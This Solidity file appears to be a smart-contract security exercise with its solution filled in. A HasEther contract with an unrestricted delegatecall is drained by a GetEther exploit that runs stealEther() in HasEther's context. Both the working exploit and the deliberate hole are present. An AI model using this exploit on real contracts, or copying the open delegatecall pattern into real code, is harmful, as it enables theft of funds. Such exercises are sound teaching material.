// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity 0.8.28;

import {console} from "forge-std/console.sol";

contract GetEther {
    // write any code you like inside this contract, but only this contract
    // get the Ether from the HasEther contract. You may not modify the test
    
    // This function will be called via delegatecall from HasEther
    // - address(this) will be the HasEther contract's address
    // - msg.sender will be the GetEther contract's address (caller of HasEther.action)
    // - address(this).balance will be HasEther's balance
    function stealEther() public {
        // Transfer HasEther's balance to GetEther (which is msg.sender here)
        (bool sent, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(sent, "Failed to send Ether to GetEther contract");
    }

    function getEther(HasEther hasEther) external {
        // 1. Prepare the calldata for our stealEther() function
        bytes memory payload = abi.encodeWithSignature("stealEther()");

        // 2. Call HasEther.action(), telling it to delegatecall to this GetEther contract (address(this))
        //    and execute the stealEther() payload
        hasEther.action(address(this), payload);
    }

    // Add receive function to allow GetEther to accept Ether
    receive() external payable {}
}

contract HasEther {

    error NotEnoughEther();

    constructor() payable {
        require(address(this).balance == 1 ether, NotEnoughEther());
    }

    function action(address to, bytes memory data) external {
        (bool success, ) = address(to).delegatecall(data);
        require(success, "Action failed");
    }
}